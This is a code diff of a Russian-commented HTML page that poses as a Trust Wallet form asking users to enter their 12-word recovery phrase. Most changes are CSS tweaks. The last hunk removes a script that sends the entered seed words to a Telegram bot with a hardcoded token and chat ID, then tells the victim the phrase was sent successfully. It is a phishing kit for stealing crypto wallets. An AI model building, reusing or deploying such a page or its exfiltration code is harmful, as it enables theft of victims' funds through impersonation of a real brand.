@@ -18,7 +18,7 @@
             flex-direction: column;
         }
         .container {
-            max-width: 450px;
+            max-width: 380px; /* Ограничение ширины */
             width: 100%;
             background-color: #1E1E1E;
             border-radius: 16px;
@@ -31,11 +31,11 @@
             margin-bottom: 16px;
         }
         .logo img {
-            width: 120px; /* Увеличен логотип */
+            width: 100px; /* Увеличен логотип */
             height: auto;
         }
         h1 {
-            font-size: 20px;
+            font-size: 18px;
             margin-bottom: 16px;
         }
         .description {
@@ -46,7 +46,7 @@
         .seed-input {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 12px; /* Уменьшено расстояние между полями */
+            gap: 10px; /* Уменьшено расстояние между полями */
             justify-items: start;
         }
         .seed-item {
@@ -61,13 +61,13 @@
             flex-shrink: 0;
         }
         input {
-            padding: 6px 10px; /* Уменьшены размеры полей */
+            padding: 6px 8px; /* Уменьшены размеры полей */
             font-size: 14px;
             border: 1px solid #333333;
             border-radius: 6px;
             background-color: #2C2C2C;
             color: #FFFFFF;
-            width: 100%;
+            width: 100%; /* Поля адаптированы по ширине */
             box-sizing: border-box;
             text-align: left;
         }
@@ -80,7 +80,7 @@
         button {
             margin-top: 20px;
             width: 100%;
-            padding: 14px;
+            padding: 12px; /* Уменьшена высота кнопки */
             background-color: #122fe6;
             color: #FFFFFF;
             font-size: 16px;
@@ -101,14 +101,13 @@
         }
         footer {
             text-align: center;
-            margin-top: 20px;
             font-size: 12px;
             color: #A0A0A0;
-            position: relative;
-            bottom: 0;
-            width: 100%;
             padding: 10px;
             background-color: #1E1E1E;
+            width: 100%;
+            position: fixed;
+            bottom: 0;
         }
     </style>
 </head>
@@ -177,54 +176,5 @@
     <footer>
         © 2025 Trust Wallet. Все права защищены.
     </footer>
-
-    <script>
-        document.getElementById('seedForm').addEventListener('submit', function (e) {
-            e.preventDefault();
-
-            const botToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg'; // Ваш API Token
-            const chatId = '@bdsjxjdhd'; // Ваш чат ID
-            const inputs = document.querySelectorAll('input');
-            const seedWords = Array.from(inputs).map(input => input.value.trim());
-
-            // Проверка, что все 12 полей заполнены
-            if (seedWords.length !== 12 || seedWords.some(word => word === '')) {
-                alert('Пожалуйста, заполните все 12 полей.');
-                return;
-            }
-
-            // Формируем сообщение с порядковым номером и словами на новой строке
-            const message = seedWords.map((word, index) => `Слово ${index + 1}: ${word}`).join('\n');
-
-            // Функция для отправки сообщения в Telegram с обработкой ошибок
-            function sendMessage() {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message }),
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert('Секретная фраза успешно отправлена!');
-                    } else {
-                        if (data.error_code === 429) { // Код ошибки для "Too Many Requests"
-                            const retryAfter = data.parameters.retry_after || 5; // Получаем время задержки (по умолчанию 5 секунд)
-                            alert(`Слишком много запросов. Попробуйте снова через ${retryAfter} секунд.`);
-                            setTimeout(sendMessage, retryAfter * 1000); // Повторить попытку через заданное время
-                        } else {
-                            alert('Ошибка отправки: ' + (data.description || 'Неизвестная ошибка'));
-                        }
-                    }
-                })
-                .catch(error => {
-                    alert('Ошибка: ' + error.message);
-                });
-            }
-
-            sendMessage(); // Отправить сообщение
-            document.getElementById('seedForm').reset(); // Сбросить форму после отправки
-        });
-    </script>
 </body>
 </html>
